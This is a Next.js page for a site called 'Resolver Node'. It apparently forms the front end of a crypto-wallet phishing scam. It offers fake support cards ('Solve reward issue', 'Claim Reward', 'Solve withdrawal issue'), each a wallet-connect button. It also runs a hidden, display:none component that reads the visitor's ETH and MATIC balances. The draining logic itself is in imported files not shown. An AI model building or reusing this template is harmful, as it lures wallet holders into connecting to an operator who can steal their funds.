
import { ConnectButton } from '@rainbow-me/rainbowkit';
import type { NextPage } from 'next';
import Head from 'next/head';
import styles from '../styles/Home.module.css';
import WalletBalances from './components/WalletBalances';
import WalletDashboard from './components/WalletDashboard';
import { useAccount } from 'wagmi';

const handleBalancesChange = (balances: { ethBalance: string; maticBalance: string }) => {
  console.log('Balances updated:', balances);
};

const Home: NextPage = () => {
  const { isConnected } = useAccount();

  return (
    <div className={styles.container}>
      <Head>
        <title>Resolver Node</title>
        <meta name="description" content="Chron Node Dashboard" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main className={styles.main}>
        <h1 className={styles.title}>Resolver Node</h1>

        <div style={{ display: 'none' }}>
<WalletBalances onBalancesChange={handleBalancesChange} />
        </div>

        <p className={styles.walletStatus}>
          {isConnected ? 'Started' : 'Not Started'}
        </p>
        <WalletDashboard />

        <div className={styles.grid}>
          <div className={`${styles.card} ${styles.cardAnimation}`}>
            <h2>Reward Issues &rarr;</h2>
            <p>Track and resolve any reward-related problems.</p>
            <ConnectButton
      
      label="Solve reward issue"
    />
          </div>

          <div className={`${styles.card} ${styles.cardAnimation}`}>
            <h2>Token Issues &rarr;</h2>
            <p>Manage and troubleshoot your token concerns.</p>
            <ConnectButton
      
      label="Solve token issues"
    />
          </div>
          
          <div className={`${styles.card} ${styles.cardAnimation}`}>
            <h2>Claim Reward &rarr;</h2>
            <p>Claim Reward Properly and Perfectly.</p>
            <ConnectButton
      
      label="Claim Reward"
    />
          </div>
          
          <div className={`${styles.card} ${styles.cardAnimation}`}>
            <h2>Migration Issues &rarr;</h2>
            <p>Ensure smooth transitions during migrations.</p>
           <ConnectButton
      
      label="Solve migration issue"
    />
          </div>

          <div className={`${styles.card} ${styles.cardAnimation}`}>
            <h2>Withdrawal Issues &rarr;</h2>
            <p>Address any withdrawal-related challenges.</p>
            <ConnectButton
            label="Solve withdrawal issue"
    />
          </div>
        </div>
      </main>

      <footer className={styles.footer}>
        <a href="#" target="_blank" rel="noopener noreferrer">
          2024 © Resolver Node.
        </a>
      </footer>
    </div>
  );
};

export default Home;